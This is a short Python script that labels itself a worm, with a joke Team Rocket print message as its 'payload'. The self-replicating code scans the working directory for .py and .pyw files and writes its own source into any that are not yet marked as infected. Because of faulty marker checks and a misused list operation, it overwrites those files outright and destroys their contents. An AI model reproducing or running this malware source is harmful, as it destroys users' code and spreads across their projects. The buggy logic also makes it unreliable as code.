# THE WORM BEGINS
import sys
import glob

virus_code = []

# Initialize worm.py for replication.
# It will spread itself to all .py files and overwrite them. 
with open(sys.argv[0], "r") as file:
	lines = file.readlines()
	file.close()

# Begin worm's self-replication behavior
replicating = False

for line in lines:
	if line == "# THE WORM BEGINS":
		replicating = True
	if not replicating:
		virus_code.append(line)
	if line == "# THE WORM ENDS":
		break

py_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in py_files: 
	with open(file, "r") as f:
		file_code = f.readlines()
		f.close()
	infected = False
	for line in file_code:
		if line == "# THE WORM BEGINS":
			infected = True
			break
	if not infected:
		final_code = []
		final_code.extend(virus_code)
		file_code.extend("\n")
		file_code.extend(file_code)
		# Appending the printed line from malicious_code()
		with open(file, "w") as f:
			f.writelines(final_code)
			f.close()


# Payload
def malicious_code():
	print("We're onto your plans, Team Rocket. We will steal back the Pokemon and eat all your noodles.")

malicious_code()

# THE WORM ENDS
